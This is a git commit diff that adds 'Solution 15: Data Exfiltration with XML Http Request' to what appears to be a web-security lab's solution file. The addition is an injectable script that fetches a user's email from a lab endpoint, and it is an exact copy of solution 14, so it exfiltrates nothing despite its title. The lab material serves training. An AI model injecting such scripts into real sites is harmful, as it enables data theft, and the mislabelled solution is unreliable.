a6f20cbd42513aedbee6f11d6f73903049c9aa1a
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-06-02 20:07:22 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -189,3 +189,24 @@ req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
 req.send();
 	
 </script>
+
+
+* Solution 15: Data Exfiltration with XML Http Request
+
+<script>
+
+var req = new XMLHttpRequest();
+req.onreadystatechange = function ()
+
+{
+	if (req.readyState == 4 && req.status == 200)
+	
+	{
+		document.getElementById("result").innerHTML = req.responseText;
+	}
+};
+
+req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
+req.send();
+	
+</script>
